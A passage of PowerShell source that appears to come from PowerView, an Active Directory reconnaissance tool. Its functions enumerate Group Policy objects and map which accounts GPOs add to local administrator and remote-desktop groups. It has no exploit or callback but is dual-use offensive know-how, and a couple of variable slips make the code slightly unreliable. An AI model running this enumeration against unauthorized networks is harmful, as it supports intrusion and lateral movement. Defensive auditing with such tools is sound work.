$TargetGptTmplPath -OutputObject -ErrorAction Stop\n                if ($Contents) {\n                    $Contents | Add-Member Noteproperty 'Path' $TargetGptTmplPath\n                    $Contents\n                }\n            }\n            else {\n                $Contents = Get-IniContent -Path $TargetGptTmplPath -ErrorAction Stop\n                if ($Contents) {\n                    $Contents['Path'] = $TargetGptTmplPath\n                    $Contents\n                }\n            }\n        }\n        catch {\n            Write-Verbose \"[Get-GptTmpl] Error parsing $TargetGptTmplPath : $_\"\n        }\n    }\n\n    END {\n        # remove the SYSVOL mappings\n        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }\n    }\n}\n\n\nfunction Get-GroupsXML {\n<#\n.SYNOPSIS\n\nHelper to parse a groups.xml file path into a custom object.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Add-RemoteConnection, Remove-RemoteConnection, ConvertTo-SID  \n\n.DESCRIPTION\n\nParses a groups.xml into a custom object. If -Credential is passed,\nAdd-RemoteConnection is used to mount \\\\TARGET\\SYSVOL with the specified creds,\nthe files are parsed, and the connection is destroyed later with Remove-RemoteConnection.\n\n.PARAMETER GroupsXMLpath\n\nSpecifies the groups.xml file path name to parse.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the remote system.\n\n.OUTPUTS\n\nPowerView.GroupsXML\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.GroupsXML')]\n    [CmdletBinding()]\n    Param (\n        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('Path')]\n        [String]\n        $GroupsXMLPath,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $MappedPaths = @{}\n    }\n\n    PROCESS {\n        try {\n            if (($GroupsXMLPath -Match '\\\\\\\\.*\\\\.*') -and ($PSBoundParameters['Credential'])) {\n                $SysVolPath = \"\\\\$((New-Object System.Uri($GroupsXMLPath)).Host)\\SYSVOL\"\n                if (-not $MappedPaths[$SysVolPath]) {\n                    # map IPC$ to this computer if it's not already\n                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential\n                    $MappedPaths[$SysVolPath] = $True\n                }\n            }\n\n            [XML]$GroupsXMLcontent = Get-Content -Path $GroupsXMLPath -ErrorAction Stop\n\n            # process all group properties in the XML\n            $GroupsXMLcontent | Select-Xml \"/Groups/Group\" | Select-Object -ExpandProperty node | ForEach-Object {\n\n                $Groupname = $_.Properties.groupName\n\n                # extract the localgroup sid for memberof\n                $GroupSID = $_.Properties.groupSid\n                if (-not $GroupSID) {\n                    if ($Groupname -match 'Administrators') {\n                        $GroupSID = 'S-1-5-32-544'\n                    }\n                    elseif ($Groupname -match 'Remote Desktop') {\n                        $GroupSID = 'S-1-5-32-555'\n                    }\n                    elseif ($Groupname -match 'Guests') {\n                        $GroupSID = 'S-1-5-32-546'\n                    }\n                    else {\n                        if ($PSBoundParameters['Credential']) {\n                            $GroupSID = ConvertTo-SID -ObjectName $Groupname -Credential $Credential\n                        }\n                        else {\n                            $GroupSID = ConvertTo-SID -ObjectName $Groupname\n                        }\n                    }\n                }\n\n                # extract out members added to this group\n                $Members = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {\n                    if ($_.sid) { $_.sid }\n                    else { $_.name }\n                }\n\n                if ($Members) {\n                    # extract out any/all filters...I hate you GPP\n                    if ($_.filters) {\n                        $Filters = $_.filters.GetEnumerator() | ForEach-Object {\n                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}\n                        }\n                    }\n                    else {\n                        $Filters = $Null\n                    }\n\n                    if ($Members -isnot [System.Array]) { $Members = @($Members) }\n\n                    $GroupsXML = New-Object PSObject\n                    $GroupsXML | Add-Member Noteproperty 'GPOPath' $TargetGroupsXMLPath\n                    $GroupsXML | Add-Member Noteproperty 'Filters' $Filters\n                    $GroupsXML | Add-Member Noteproperty 'GroupName' $GroupName\n                    $GroupsXML | Add-Member Noteproperty 'GroupSID' $GroupSID\n                    $GroupsXML | Add-Member Noteproperty 'GroupMemberOf' $Null\n                    $GroupsXML | Add-Member Noteproperty 'GroupMembers' $Members\n                    $GroupsXML.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')\n                    $GroupsXML\n                }\n            }\n        }\n        catch {\n            Write-Verbose \"[Get-GroupsXML] Error parsing $TargetGroupsXMLPath : $_\"\n        }\n    }\n\n    END {\n        # remove the SYSVOL mappings\n        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }\n    }\n}\n\n\nfunction Get-DomainGPO {\n<#\n.SYNOPSIS\n\nReturn all GPOs or specific GPO objects in AD.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainSearcher, Get-DomainComputer, Get-DomainUser, Get-DomainOU, Get-NetComputerSiteName, Get-DomainSite, Get-DomainObject, Convert-LDAPProperty  \n\n.DESCRIPTION\n\nBuilds a directory searcher object using Get-DomainSearcher, builds a custom\nLDAP filter based on targeting/filter parameters, and searches for all objects\nmatching the criteria. To only return specific properties, use\n\"-Properties samaccountname,usnchanged,...\". By default, all GPO objects for\nthe current domain are returned. To enumerate all GPOs that are applied to\na particular machine, use -ComputerName X.\n\n.PARAMETER Identity\n\nA display name (e.g. 'Test GPO'), DistinguishedName (e.g. 'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'),\nGUID (e.g. '10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO name (e.g. '{F260B76D-55C8-46C5-BEF1-9016DD98E272}'). Wildcards accepted.\n\n.PARAMETER ComputerIdentity\n\nReturn all GPO objects applied to a given computer identity (name, dnsname, DistinguishedName, etc.).\n\n.PARAMETER UserIdentity\n\nReturn all GPO objects applied to a given user identity (name, SID, DistinguishedName, etc.).\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER Properties\n\nSpecifies the properties of the output object to retrieve from the server.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER SecurityMasks\n\nSpecifies an option for examining security information of a directory object.\nOne of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER FindOne\n\nOnly return one result object.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.PARAMETER Raw\n\nSwitch. Return raw results instead of translating the fields into a custom PSObject.\n\n.EXAMPLE\n\nGet-DomainGPO -Domain testlab.local\n\nReturn all GPOs for the testlab.local domain\n\n.EXAMPLE\n\nGet-DomainGPO -ComputerName windows1.testlab.local\n\nReturns all GPOs applied windows1.testlab.local\n\n.EXAMPLE\n\n\"{F260B76D-55C8-46C5-BEF1-9016DD98E272}\",\"Test GPO\" | Get-DomainGPO\n\nReturn the GPOs with the name of \"{F260B76D-55C8-46C5-BEF1-9016DD98E272}\" and the display\nname of \"Test GPO\"\n\n.EXAMPLE\n\nGet-DomainGPO -LDAPFilter '(!primarygroupid=513)' -Properties samaccountname,lastlogon\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainGPO -Credential $Cred\n\n.OUTPUTS\n\nPowerView.GPO\n\nCustom PSObject with translated GPO property fields.\n\nPowerView.GPO.Raw\n\nThe raw DirectoryServices.SearchResult object, if -Raw is enabled.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]\n    [OutputType('PowerView.GPO')]\n    [OutputType('PowerView.GPO.Raw')]\n    [CmdletBinding(DefaultParameterSetName = 'None')]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name')]\n        [String[]]\n        $Identity,\n\n        [Parameter(ParameterSetName = 'ComputerIdentity')]\n        [Alias('ComputerName')]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerIdentity,\n\n        [Parameter(ParameterSetName = 'UserIdentity')]\n        [Alias('UserName')]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $UserIdentity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]\n        [String]\n        $SecurityMasks,\n\n        [Switch]\n        $Tombstone,\n\n        [Alias('ReturnOne')]\n        [Switch]\n        $FindOne,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [Switch]\n        $Raw\n    )\n\n    BEGIN {\n        $SearcherArguments = @{}\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n        $GPOSearcher = Get-DomainSearcher @SearcherArguments\n    }\n\n    PROCESS {\n        if ($GPOSearcher) {\n            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {\n                $GPOAdsPaths = @()\n                if ($SearcherArguments['Properties']) {\n                    $OldProperties = $SearcherArguments['Properties']\n                }\n                $SearcherArguments['Properties'] = 'distinguishedname,dnshostname'\n                $TargetComputerName = $Null\n\n                if ($PSBoundParameters['ComputerIdentity']) {\n                    $SearcherArguments['Identity'] = $ComputerIdentity\n                    $Computer = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1\n                    if(-not $Computer) {\n                        Write-Verbose \"[Get-DomainGPO] Computer '$ComputerIdentity' not found!\"\n                    }\n                    $ObjectDN = $Computer.distinguishedname\n                    $TargetComputerName = $Computer.dnshostname\n                }\n                else {\n                    $SearcherArguments['Identity'] = $UserIdentity\n                    $User = Get-DomainUser @SearcherArguments -FindOne | Select-Object -First 1\n                    if(-not $User) {\n                        Write-Verbose \"[Get-DomainGPO] User '$UserIdentity' not found!\"\n                    }\n                    $ObjectDN = $User.distinguishedname\n                }\n\n                # extract all OUs the target user/computer is a part of\n                $ObjectOUs = @()\n                $ObjectOUs += $ObjectDN.split(',') | ForEach-Object {\n                    if($_.startswith('OU=')) {\n                        $ObjectDN.SubString($ObjectDN.IndexOf(\"$($_),\"))\n                    }\n                }\n                Write-Verbose \"[Get-DomainGPO] object OUs: $ObjectOUs\"\n\n                if ($ObjectOUs) {\n                    # find all the GPOs linked to the user/computer's OUs\n                    $SearcherArguments.Remove('Properties')\n                    $InheritanceDisabled = $False\n                    ForEach($ObjectOU in $ObjectOUs) {\n                        $SearcherArguments['Identity'] = $ObjectOU\n                        $GPOAdsPaths += Get-DomainOU @SearcherArguments | ForEach-Object {\n                            # extract any GPO links for this particular OU the computer is a part of\n                            if ($_.gplink) {\n                                $_.gplink.split('][') | ForEach-Object {\n                                    if ($_.startswith('LDAP')) {\n                                        $Parts = $_.split(';')\n                                        $GpoDN = $Parts[0]\n                                        $Enforced = $Parts[1]\n\n                                        if ($InheritanceDisabled) {\n                                            # if inheritance has already been disabled and this GPO is set as \"enforced\"\n                                            #   then add it, otherwise ignore it\n                                            if ($Enforced -eq 2) {\n                                                $GpoDN\n                                            }\n                                        }\n                                        else {\n                                            # inheritance not marked as disabled yet\n                                            $GpoDN\n                                        }\n                                    }\n                                }\n                            }\n\n                            # if this OU has GPO inheritence disabled, break so additional OUs aren't processed\n                            if ($_.gpoptions -eq 1) {\n                                $InheritanceDisabled = $True\n                            }\n                        }\n                    }\n                }\n\n                if ($TargetComputerName) {\n                    # find all the GPOs linked to the computer's site\n                    $ComputerSite = (Get-NetComputerSiteName -ComputerName $TargetComputerName).SiteName\n                    if($ComputerSite -and ($ComputerSite -notlike 'Error*')) {\n                        $SearcherArguments['Identity'] = $ComputerSite\n                        $GPOAdsPaths += Get-DomainSite @SearcherArguments | ForEach-Object {\n                            if($_.gplink) {\n                                # extract any GPO links for this particular site the computer is a part of\n                                $_.gplink.split('][') | ForEach-Object {\n                                    if ($_.startswith('LDAP')) {\n                                        $_.split(';')[0]\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n\n                # find any GPOs linked to the user/computer's domain\n                $ObjectDomainDN = $ObjectDN.SubString($ObjectDN.IndexOf('DC='))\n                $SearcherArguments.Remove('Identity')\n                $SearcherArguments.Remove('Properties')\n                $SearcherArguments['LDAPFilter'] = \"(objectclass=domain)(distinguishedname=$ObjectDomainDN)\"\n                $GPOAdsPaths += Get-DomainObject @SearcherArguments | ForEach-Object {\n                    if($_.gplink) {\n                        # extract any GPO links for this particular domain the computer is a part of\n                        $_.gplink.split('][') | ForEach-Object {\n                            if ($_.startswith('LDAP')) {\n                                $_.split(';')[0]\n                            }\n                        }\n                    }\n                }\n                Write-Verbose \"[Get-DomainGPO] GPOAdsPaths: $GPOAdsPaths\"\n\n                # restore the old properites to return, if set\n                if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }\n                else { $SearcherArguments.Remove('Properties') }\n                $SearcherArguments.Remove('Identity')\n\n                $GPOAdsPaths | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {\n                    # use the gplink as an ADS path to enumerate all GPOs for the computer\n                    $SearcherArguments['SearchBase'] = $_\n                    $SearcherArguments['LDAPFilter'] = \"(objectCategory=groupPolicyContainer)\"\n                    Get-DomainObject @SearcherArguments | ForEach-Object {\n                        if ($PSBoundParameters['Raw']) {\n                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')\n                        }\n                        else {\n                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')\n                        }\n                        $_\n                    }\n                }\n            }\n            else {\n                $IdentityFilter = ''\n                $Filter = ''\n                $Identity | Where-Object {$_} | ForEach-Object {\n                    $IdentityInstance = $_.Replace('(', '\\28').Replace(')', '\\29')\n                    if ($IdentityInstance -match 'LDAP://|^CN=.*') {\n                        $IdentityFilter += \"(distinguishedname=$IdentityInstance)\"\n                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {\n                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname\n                            #   and rebuild the domain searcher\n                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                            Write-Verbose \"[Get-DomainGPO] Extracted domain '$IdentityDomain' from '$IdentityInstance'\"\n                            $SearcherArguments['Domain'] = $IdentityDomain\n                            $GPOSearcher = Get-DomainSearcher @SearcherArguments\n                            if (-not $GPOSearcher) {\n                                Write-Warning \"[Get-DomainGPO] Unable to retrieve domain searcher for '$IdentityDomain'\"\n                            }\n                        }\n                    }\n                    elseif ($IdentityInstance -match '{.*}') {\n                        $IdentityFilter += \"(name=$IdentityInstance)\"\n                    }\n                    else {\n                        try {\n                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\\$1'\n                            $IdentityFilter += \"(objectguid=$GuidByteString)\"\n                        }\n                        catch {\n                            $IdentityFilter += \"(displayname=$IdentityInstance)\"\n                        }\n                    }\n                }\n                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {\n                    $Filter += \"(|$IdentityFilter)\"\n                }\n\n                if ($PSBoundParameters['LDAPFilter']) {\n                    Write-Verbose \"[Get-DomainGPO] Using additional LDAP filter: $LDAPFilter\"\n                    $Filter += \"$LDAPFilter\"\n                }\n\n                $GPOSearcher.filter = \"(&(objectCategory=groupPolicyContainer)$Filter)\"\n                Write-Verbose \"[Get-DomainGPO] filter string: $($GPOSearcher.filter)\"\n\n                if ($PSBoundParameters['FindOne']) { $Results = $GPOSearcher.FindOne() }\n                else { $Results = $GPOSearcher.FindAll() }\n                $Results | Where-Object {$_} | ForEach-Object {\n                    if ($PSBoundParameters['Raw']) {\n                        # return raw result objects\n                        $GPO = $_\n                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')\n                    }\n                    else {\n                        if ($PSBoundParameters['SearchBase'] -and ($SearchBase -Match '^GC://')) {\n                            $GPO = Convert-LDAPProperty -Properties $_.Properties\n                            try {\n                                $GPODN = $GPO.distinguishedname\n                                $GPODomain = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                                $gpcfilesyspath = \"\\\\$GPODomain\\SysVol\\$GPODomain\\Policies\\$($GPO.cn)\"\n                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $gpcfilesyspath\n                            }\n                            catch {\n                                Write-Verbose \"[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)\"\n                            }\n                        }\n                        else {\n                            $GPO = Convert-LDAPProperty -Properties $_.Properties\n                        }\n                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')\n                    }\n                    $GPO\n                }\n                if ($Results) {\n                    try { $Results.dispose() }\n                    catch {\n                        Write-Verbose \"[Get-DomainGPO] Error disposing of the Results object: $_\"\n                    }\n                }\n                $GPOSearcher.dispose()\n            }\n        }\n    }\n}\n\n\nfunction Get-DomainGPOLocalGroup {\n<#\n.SYNOPSIS\n\nReturns all GPOs in a domain that modify local group memberships through 'Restricted Groups'\nor Group Policy preferences. Also return their user membership mappings, if they exist.\n\nAuthor: @harmj0y  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainGPO, Get-GptTmpl, Get-GroupsXML, ConvertTo-SID, ConvertFrom-SID  \n\n.DESCRIPTION\n\nFirst enumerates all GPOs in the current/target domain using Get-DomainGPO with passed\narguments, and for each GPO checks if 'Restricted Groups' are set with GptTmpl.inf or\ngroup membership is set through Group Policy Preferences groups.xml files. For any\nGptTmpl.inf files found, the file is parsed with Get-GptTmpl and any 'Group Membership'\nsection data is processed if present. Any found Groups.xml files are parsed with\nGet-GroupsXML and those memberships are returned as well.\n\n.PARAMETER Identity\n\nA display name (e.g. 'Test GPO'), DistinguishedName (e.g. 'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'),\nGUID (e.g. '10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO name (e.g. '{F260B76D-55C8-46C5-BEF1-9016DD98E272}'). Wildcards accepted.\n\n.PARAMETER ResolveMembersToSIDs\n\nSwitch. Indicates that any member names should be resolved to their domain SIDs.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainGPOLocalGroup\n\nReturns all local groups set by GPO along with their members and memberof.\n\n.EXAMPLE\n\nGet-DomainGPOLocalGroup -ResolveMembersToSIDs\n\nReturns all local groups set by GPO along with their members and memberof,\nand resolve any members to their domain SIDs.\n\n.EXAMPLE\n\n'{0847C615-6C4E-4D45-A064-6001040CC21C}' | Get-DomainGPOLocalGroup\n\nReturn any GPO-set groups for the GPO with the given name/GUID.\n\n.EXAMPLE\n\nGet-DomainGPOLocalGroup 'Desktops'\n\nReturn any GPO-set groups for the GPO with the given display name.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainGPOLocalGroup -Credential $Cred\n\n.LINK\n\nhttps://morgansimonsenblog.azurewebsites.net/tag/groups/\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.GPOGroup')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name')]\n        [String[]]\n        $Identity,\n\n        [Switch]\n        $ResolveMembersToSIDs,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $SearcherArguments = @{}\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $Domain }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n\n        $ConvertArguments = @{}\n        if ($PSBoundParameters['Domain']) { $ConvertArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }\n        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }\n\n        $SplitOption = [System.StringSplitOptions]::RemoveEmptyEntries\n    }\n\n    PROCESS {\n        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }\n\n        Get-DomainGPO @SearcherArguments | ForEach-Object {\n            $GPOdisplayName = $_.displayname\n            $GPOname = $_.name\n            $GPOPath = $_.gpcfilesyspath\n\n            $ParseArgs =  @{ 'GptTmplPath' = \"$GPOPath\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\" }\n            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }\n\n            # first parse the 'Restricted Groups' file (GptTmpl.inf) if it exists\n            $Inf = Get-GptTmpl @ParseArgs\n\n            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {\n                $Memberships = @{}\n\n                # parse the members/memberof fields for each entry\n                ForEach ($Membership in $Inf.'Group Membership'.GetEnumerator()) {\n                    $Group, $Relation = $Membership.Key.Split('__', $SplitOption) | ForEach-Object {$_.Trim()}\n                    # extract out ALL members\n                    $MembershipValue = $Membership.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}\n\n                    if ($PSBoundParameters['ResolveMembersToSIDs']) {\n                        # if the resulting member is username and not a SID, attempt to resolve it\n                        $GroupMembers = @()\n                        ForEach ($Member in $MembershipValue) {\n                            if ($Member -and ($Member.Trim() -ne '')) {\n                                if ($Member -notmatch '^S-1-.*') {\n                                    $ConvertToArguments = @{'ObjectName' = $Member}\n                                    if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }\n                                    $MemberSID = ConvertTo-SID @ConvertToArguments\n\n                                    if ($MemberSID) {\n                                        $GroupMembers += $MemberSID\n                                    }\n                                    else {\n                                        $GroupMembers += $Member\n                                    }\n                                }\n                                else {\n                                    $GroupMembers += $Member\n                                }\n                            }\n                        }\n                        $MembershipValue = $GroupMembers\n                    }\n\n                    if (-not $Memberships[$Group]) {\n                        $Memberships[$Group] = @{}\n                    }\n                    if ($MembershipValue -isnot [System.Array]) {$MembershipValue = @($MembershipValue)}\n                    $Memberships[$Group].Add($Relation, $MembershipValue)\n                }\n\n                ForEach ($Membership in $Memberships.GetEnumerator()) {\n                    if ($Membership -and $Membership.Key -and ($Membership.Key -match '^\\*')) {\n                        # if the SID is already resolved (i.e. begins with *) try to resolve SID to a name\n                        $GroupSID = $Membership.Key.Trim('*')\n                        if ($GroupSID -and ($GroupSID.Trim() -ne '')) {\n                            $GroupName = ConvertFrom-SID -ObjectSID $GroupSID @ConvertArguments\n                        }\n                        else {\n                            $GroupName = $False\n                        }\n                    }\n                    else {\n                        $GroupName = $Membership.Key\n\n                        if ($GroupName -and ($GroupName.Trim() -ne '')) {\n                            if ($Groupname -match 'Administrators') {\n                                $GroupSID = 'S-1-5-32-544'\n                            }\n                            elseif ($Groupname -match 'Remote Desktop') {\n                                $GroupSID = 'S-1-5-32-555'\n                            }\n                            elseif ($Groupname -match 'Guests') {\n                                $GroupSID = 'S-1-5-32-546'\n                            }\n                            elseif ($GroupName.Trim() -ne '') {\n                                $ConvertToArguments = @{'ObjectName' = $Groupname}\n                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }\n                                $GroupSID = ConvertTo-SID @ConvertToArguments\n                            }\n                            else {\n                                $GroupSID = $Null\n                            }\n                        }\n                    }\n\n                    $GPOGroup = New-Object PSObject\n                    $GPOGroup | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName\n                    $GPOGroup | Add-Member Noteproperty 'GPOName' $GPOName\n                    $GPOGroup | Add-Member Noteproperty 'GPOPath' $GPOPath\n                    $GPOGroup | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'\n                    $GPOGroup | Add-Member Noteproperty 'Filters' $Null\n                    $GPOGroup | Add-Member Noteproperty 'GroupName' $GroupName\n                    $GPOGroup | Add-Member Noteproperty 'GroupSID' $GroupSID\n                    $GPOGroup | Add-Member Noteproperty 'GroupMemberOf' $Membership.Value.Memberof\n                    $GPOGroup | Add-Member Noteproperty 'GroupMembers' $Membership.Value.Members\n                    $GPOGroup.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')\n                    $GPOGroup\n                }\n            }\n\n            # now try to the parse group policy preferences file (Groups.xml) if it exists\n            $ParseArgs =  @{\n                'GroupsXMLpath' = \"$GPOPath\\MACHINE\\Preferences\\Groups\\Groups.xml\"\n            }\n\n            Get-GroupsXML @ParseArgs | ForEach-Object {\n                if ($PSBoundParameters['ResolveMembersToSIDs']) {\n                    $GroupMembers = @()\n                    ForEach ($Member in $_.GroupMembers) {\n                        if ($Member -and ($Member.Trim() -ne 